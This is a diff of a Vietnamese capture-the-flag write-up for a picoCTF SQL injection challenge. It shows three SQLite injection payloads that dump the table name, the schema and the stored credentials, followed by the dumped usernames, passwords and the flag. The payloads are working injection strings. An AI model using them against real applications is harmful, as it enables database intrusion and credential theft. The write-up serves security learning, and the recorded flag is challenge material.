@@ -17,17 +17,19 @@ WHERE username = '<username>' AND password = '<password>';
 - lợi dụng điểm này ta có thể dùng nối chuỗi để nối lệnh SQL khiến nó trả ra thông tin cho phần amount
 - vì là nhập giá trị trên burpsuite nên ta cần dùng /**/ thay thế space để kh phá vỡ input
 - payload 1 : dump tên bảng
-  
+ ` 
 '||(select/**/tbl_name/**/FROM/**/sqlite_master/**/WHERE/**/type='table')||'
+`
 ![Exploit](image/image4.png)
 - vậy là ta đã dump được tên bảng là startup_users
 - payload 2 : dump tên cột trong bảng qua sql
-
+`
 '||(SELECT/**/sql/**/FROM/**/sqlite_master/**/WHERE/**/type='table'/**/AND/**/tbl_name='startup_users')||'
+`
 - ta thu được CREATE TABLE startup_users (nameuser text, wordpass text, money int)
 - payload 3: dump giá trị
-  
+ ` 
 '||(SELECT/**/GROUP_CONCAT(nameuser||':'||wordpass,/**/'|')/**/FROM/**/startup_users)||'
 - thu được
-  $admin:password|ron:not_the_flag_db1d1c41|veronica:not_the_flag_de19f38f|brick:not_the_flag_6d8cfc3e|brian:not_the_flag_f96b8d32|champ:not_the_flag_3e25274b|the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}|qwwe:qwe
+ ` $admin:password|ron:not_the_flag_db1d1c41|veronica:not_the_flag_de19f38f|brick:not_the_flag_6d8cfc3e|brian:not_the_flag_f96b8d32|champ:not_the_flag_3e25274b|the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}|qwwe:qwe
 - Flag :  picoCTF{1_c4nn0t_s33_y0u_58183fce}
